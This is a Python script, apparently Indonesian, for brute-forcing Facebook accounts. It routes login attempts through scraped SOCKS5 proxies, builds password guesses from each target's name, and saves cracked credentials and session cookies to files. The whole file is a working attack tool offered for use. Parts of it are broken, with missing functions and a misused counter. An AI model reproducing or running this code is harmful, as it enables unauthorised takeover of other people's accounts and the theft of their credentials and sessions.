#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests, re, os, random, sys,bs4,time,json
from bs4 import BeautifulSoup as parser
from random import choice
from concurrent.futures import ThreadPoolExecutor as upil
from datetime import date
from datetime import datetime
from urllib.parse import quote
from platform import platform
from urllib.error import URLError
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
 	if n < 0 or n > 12:
 		exit()
 	nTemp = n - 1
except ValueError:
 	exit()
current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
warna = random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m' #
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
tanggal = '%s-%s-%s'%(ha,op,ta)
tanggal.split('/')
ses=requests.session()
loop = 0
id = []
ok = []
cp = []

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mÃ¢â‚¬Â¢\x1b[1;97m] [\x1b[1;96mCluuuut')
prox=open('.prox.txt','r').read().splitlines()

def real_time():
	from time import time
	return str(time()).split('.')[0]

def banner():
	print('''.oPYo.                     8 \n8    8                     8 \n8      oPYo. .oPYo. .oPYo. 8  .o \n8      8  `' .oooo8 8    ' 8oP' \n8      8     8    8 8    . 8 `b. \n`YooP' 8     `YooP8 `YooP' 8  `o. \n:......:..:::::.....::.....:..::......\n: ##### :   \033[1;93mUPIL FACEBOOK\033[0m    : ##### :\n::::::::::::::::::::::::::::::::::::::''') 



def Crack(id):
	ask = input("\n * menggunakan sandi manual..? [Y/t]: ")
	if ask in ["", " "]:
		exit("\n * isi yang benar jangan kosong")
	elif ask in ["y", "Y"]:
		pwx = input(" * tebak kata sandi : ")
		if len(pwx)<=5:
			exit("\n * kata sandi minimal 6 karakter")
		prints(f'\n * 01. FACEBOOK LITE \n * 02. CHROME LINUX \n * 03. ALL BROWSER')
		method = input("\n * pilih : ")
		if method in ["1", "01"]:
			with upil(max_workers=30) as coeg:
				print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
				print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(lite, uid, pwx.split(','))
			print("\n\n [#] crack selesai...")
			exit()
		elif method in ["2", "02"]:
			with upil(max_workers=30) as coeg:
				print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
				print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(browser, uid, pwx.split(','))
			print("\n\n [#] crack selesai...")
			exit()
		elif method in ["3", "03"]:
			with upil(max_workers=30) as coeg:
				print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
				print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(chrome, uid, pwx.split(","))
			print("\n\n [#] crack selesai...")
			exit()
	elif ask in ["t", "T"]:
		prints(f'\n * 01. FACEBOOK LITE \n * 02. CHROME LINUX\n * 03. ALL BROWSER')
		method = input("\n * pilih : ")
		if method in ["1", "01"]:
			with upil(max_workers=30) as coeg:
				print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
				print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
				for user in id:
					try:
						uid, name = user.split("<=>")
						ss = name.split(" ")
						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
						coeg.submit(lite2, uid, pwx)
					except:pass
			print("\n\n [#] crack selesai...")
			exit()
		elif method in ["2", "02"]:
			with upil(max_workers=30) as coeg:
				print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
				print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
				for user in id:
					try:
						uid, name = user.split("<=>")
						ss = name.split(" ")
						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
						coeg.submit(browser2, uid, pwx)
					except:pass
			print("\n\n [#] crack selesai...")
			exit()
		elif method in ["3", "03"]:
			with upil(max_workers=30) as coeg:
				print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
				print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
				for user in id:
					try:
						uid, name = user.split("<=>")
						ss = name.split(" ")
						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
						coeg.submit(chrome2, uid, pwx)
					except:pass
			print("\n\n [#] crack selesai...")
			exit()


def browser2(user,pwx):
	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
	rr = open("uaku.txt", "r").read().splitlines()
	uaa=random.choice(rr)
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ses=requests.session()
	for pw in pwx:
		head1 = {
			'Host':'m.facebook.com',
			'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
			'user-agent':uaa,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		try:
			r=ses.get(f"https://m.facebook.com/", headers=head1).text.encode('utf-8')
		except:
			r=ses.get(f"https://m.facebook.com/", headers=head1).text
		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
		head2={
			'Host':'m.facebook.com',
			'user-agent':uaa,
			'content-type':'application/x-www-form-urlencoded',
			'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			'accept':'*/*',
			'origin':'https://m.facebook.com',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
			'referer':'https://m.facebook.com/',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		p=ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date,headers=head2, proxies=proxs, allow_redirects=False)
		if "c_user" in ses.cookies.get_dict():
			cok = ses.cookies.get_dict()
			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
			print("\r *\033[1;34m OK | %s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
			ok.append("%s|%s"%(user, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" * %s|%s\n"%(user, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict():
			print("\r * \033[1;93mCP | %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
			cp.append("%s|%s"%(user, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		else:
			continue

	loop+=1

def chrome2(user,pwx):
	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
	rr = open("uaku.txt", "r").read().splitlines()
	uaa=random.choice(rr)
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ses=requests.session()
	for pw in pwx:
		head1 = {
			'Host':'m.facebook.com',
			'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
			'user-agent':uaa,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site':'none',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'sec-ch-ua':'".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
			'sec-ch-ua-mobile':'?0',
			'sec-ch-ua-platform':'"Linux"',
			'accept-encoding':'gzip, deflate, br',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		link=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text
		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(link)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(link)).group(1), "li": re.search('name="li" value="(.*?)"',str(link)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
		head2={
			'Host':'m.facebook.com',
			'content-length':re.search('name="content-length" value="(.*?)"', str(link)),
			'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			'sec-ch-ua-mobile':'?0',
			'user-agent':uaa,
			'sec-ch-ua':'".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
			'sec-ch-ua-platform':'"Linux"',
			'content-type':'application/x-www-form-urlencoded',
			'accept':'*/*',
			'origin':'https://m.facebook.com',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
			'referer':'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8',
			'accept-encoding':'gzip, deflate, br',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		p=ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=date,headers=head2, proxies=proxs, allow_redirects=False)
		if "c_user" in ses.cookies.get_dict():
			cok = ses.cookies.get_dict()
			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
			print("\r *\033[1;34m OK | %s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
			ok.append("%s|%s"%(user, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" * %s|%s\n"%(user, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict():
			print("\r * \033[1;93mCP | %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
			cp.append("%s|%s"%(user, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		else:
			continue

	loop+=1

def lite2(user,pwx):
	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
	rr = open("uaku.txt", "r").read().splitlines()
	uaa=random.choice(rr)
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ses=requests.session()
	for pw in pwx:
		head1 = {
			'Host':'m.facebook.com',
			'upgrade-insecure-requests':'1',
			'user-agent':'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/315.0.0.18.109;FBDM/DisplayMetrics{density=1.5, width=540, height=960, scaledDensity=1.5, xdpi=221.225, ydpi=221.67201};]',
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with':'com.facebook.lite',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'referer':'https://m.facebook.com/palanda.elvantan?ref_component=mbasic_home_bookmark&ref_page=%2Fwap%2Fhome.php&refid=7',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		r=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers=head1).text
		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw, 'login':'Masuk','bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"', str(r)).group(1)}
		head2={
			'Host':'m.facebook.com',
			'content-length':'186',
			'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
			'origin':'https://m.facebook.com',
			'content-type':'application/x-www-form-urlencoded',
			'user-agent':'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/315.0.0.18.109;FBDM/DisplayMetrics{density=1.5, width=540, height=960, scaledDensity=1.5, xdpi=221.225, ydpi=221.67201};]',
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with':'com.facebook.lite',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'referer':'https://m.facebook.com/?stype=lo&jlou=AffokRwWTYW2rV-o-d_iItugkkR9Vd9bJ0BeUSLjOqT3Y1b6-Jend_QNeClPSJRp19FcwGEuzTU97W8ObSVKPEWMo9FuIs4-i3RVtRZR2AUzTA&smuh=5796&lh=Ac_dnvSUPXoDi71mlTM&refid=17&_rdr',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		p=ses.post(f"https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",data=date,headers=head2, proxies=proxs, allow_redirects=False)
		if "c_user" in ses.cookies.get_dict():
			cok = ses.cookies.get_dict()
			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
			print("\r *\033[1;34m OK | %s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
			ok.append("%s|%s"%(user, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict():
			print("\r * \033[1;93mCP | %s | %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
			cp.append("%s|%s"%(user, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		else:
			continue

	loop+=1

